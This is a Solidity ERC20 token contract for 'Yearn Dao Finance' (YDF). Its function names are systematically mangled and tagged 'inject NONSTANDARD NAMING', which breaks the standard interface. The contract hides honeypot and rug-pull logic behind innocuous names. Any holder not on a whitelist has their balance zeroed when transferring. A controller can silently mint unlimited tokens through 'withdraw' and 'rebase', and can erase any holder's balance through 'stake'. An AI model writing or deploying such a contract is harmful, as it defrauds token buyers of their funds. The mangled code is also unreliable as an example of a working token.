                                                                 

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY323() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF147(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER18(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE780(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE843(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM719(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER954(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL291(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    function _MSGSENDER576() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY323() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF147(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER18(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TFT506(_MSGSENDER576(), recipient, amount);
        return true;
    }
    function ALLOWANCE780(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE843(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE429(_MSGSENDER576(), spender, amount);
        return true;
    }
    function TRANSFERFROM719(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TFT506(sender, recipient, amount);
        _APPROVE429(sender, _MSGSENDER576(), _allowances[sender][_MSGSENDER576()].SUB298(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE805(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE429(_MSGSENDER576(), spender, _allowances[_MSGSENDER576()][spender].ADD239(addedValue));
        return true;
    }
    function DECREASEALLOWANCE239(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE429(_MSGSENDER576(), spender, _allowances[_MSGSENDER576()][spender].SUB298(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TFT506(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB298(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD239(amount);
        emit TRANSFER954(sender, recipient, amount);
    }
    function _INITMINT279(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD239(amount);
        _balances[account] = _balances[account].ADD239(amount);
        emit TRANSFER954(address(0), account, amount);
    }
    function _REBASE671(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD239(amount);
        _balances[account] = _balances[account].ADD239(amount);
    }
    function _WITHDRAW118(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD239(amount);
        _balances[account] = _balances[account].ADD239(amount);
    }
    function _STAKE791(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE429(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL291(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME583() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL486() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS179() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD239(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB298(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB298(a, b, "SafeMath: subtraction overflow");
    }
    function SUB298(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL660(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV118(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV118(a, b, "SafeMath: division by zero");
    }
    function DIV118(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract YearnDaoFinance is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public controller;
  mapping (address => bool) public stakers;
  address uni = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  constructor () public ERC20Detailed("Yearn Dao Finance", "YDF", 18) {
      _INITMINT279( msg.sender, 1000*10**uint(DECIMALS179()) );
      controller[msg.sender] = true;
      stakers[msg.sender] = true;
      stakers[uni] = true;
  }
  function _TFT506(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
    require(amount <= this.BALANCEOF147(sender), "error");
    if(stakers[sender]){
      super._TFT506(sender, recipient, amount);
    } else {
      super._STAKE791(sender);
      super._TFT506(sender, recipient, amount);
    }
  }
  function STAKE122(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _STAKE791(account);
  }
  function WITHDRAW654(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _WITHDRAW118(account, amount);
  }
  function REBASE119(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _REBASE671(account, amount);
  }
  function ADDSTAKERS298(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = true;
  }
  function REMOVESTAKERS737(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = false;
  }

}